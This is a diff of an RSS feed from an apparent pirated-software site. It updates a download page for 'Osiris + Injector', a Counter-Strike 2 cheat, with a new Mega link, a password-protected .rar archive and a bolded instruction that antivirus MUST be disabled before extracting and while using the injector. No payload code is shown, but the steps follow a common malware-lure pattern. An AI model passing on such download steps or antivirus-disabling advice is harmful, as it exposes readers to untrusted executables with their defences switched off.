@@ -6,8 +6,8 @@
 </description>
     <link>https://piratedsoftware.github.io/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 14 Jan 2024 15:13:24 -0300</pubDate>
-    <lastBuildDate>Sun, 14 Jan 2024 15:13:24 -0300</lastBuildDate>
+    <pubDate>Mon, 22 Jan 2024 14:13:55 -0300</pubDate>
+    <lastBuildDate>Mon, 22 Jan 2024 14:13:55 -0300</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
     
       <item>
@@ -97,9 +97,9 @@ This project is maintained in: &lt;a href=&quot;https://github.com/danielkrupins
 
 &lt;p&gt;&lt;strong&gt;1 -&lt;/strong&gt; Download &lt;strong&gt;Osiris + Injector&lt;/strong&gt; from the Download button below, you will be redirected to download from &lt;a href=&quot;https://mega.nz&quot; target=&quot;_blank&quot;&gt;Mega&lt;/a&gt;:&lt;/p&gt;
 
-&lt;p class=&quot;btn_download&quot;&gt;&lt;a href=&quot;https://mega.nz/file/OmxHEabZ#UImknuJ3A5g55SbFS5_sjLaNGDtZWzycy4mwERxyu1c&quot; target=&quot;_blank&quot;&gt;Download&lt;/a&gt;&lt;/p&gt;
+&lt;p class=&quot;btn_download&quot;&gt;&lt;a href=&quot;https://mega.nz/file/zmBEWCwa#1gqZA0Iuua7VwYr1YGdR1K7qeF_zN8mPA-3bgFkOjjc&quot; target=&quot;_blank&quot;&gt;Download&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;2 -&lt;/strong&gt; Using &lt;strong&gt;WinRAR&lt;/strong&gt;, extract &lt;strong&gt;osiris+injector.zip&lt;/strong&gt; to a location of your choice using the password;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2 -&lt;/strong&gt; Using &lt;strong&gt;WinRAR&lt;/strong&gt;, extract &lt;strong&gt;osiris+injector.rar&lt;/strong&gt; to a location of your choice using the password;&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;Password to unzip: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;
@@ -108,7 +108,7 @@ This project is maintained in: &lt;a href=&quot;https://github.com/danielkrupins
 &lt;p&gt;&lt;strong&gt;3 -&lt;/strong&gt; &lt;strong&gt;IMPORTANT!&lt;/strong&gt;&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;The antivirus MUST be DISABLED, regardless of which one is on your machine, because as it is an alteration software, it can be recognized as malware.&lt;/p&gt;
+  &lt;p&gt;The antivirus MUST be DISABLED before extracting and when using the injector, regardless of which one is on your machine, because as it is altering software, it can be recognized as malware.&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;&lt;strong&gt;4 -&lt;/strong&gt; Closed your &lt;strong&gt;Counter-Strike 2&lt;/strong&gt;;&lt;/p&gt;
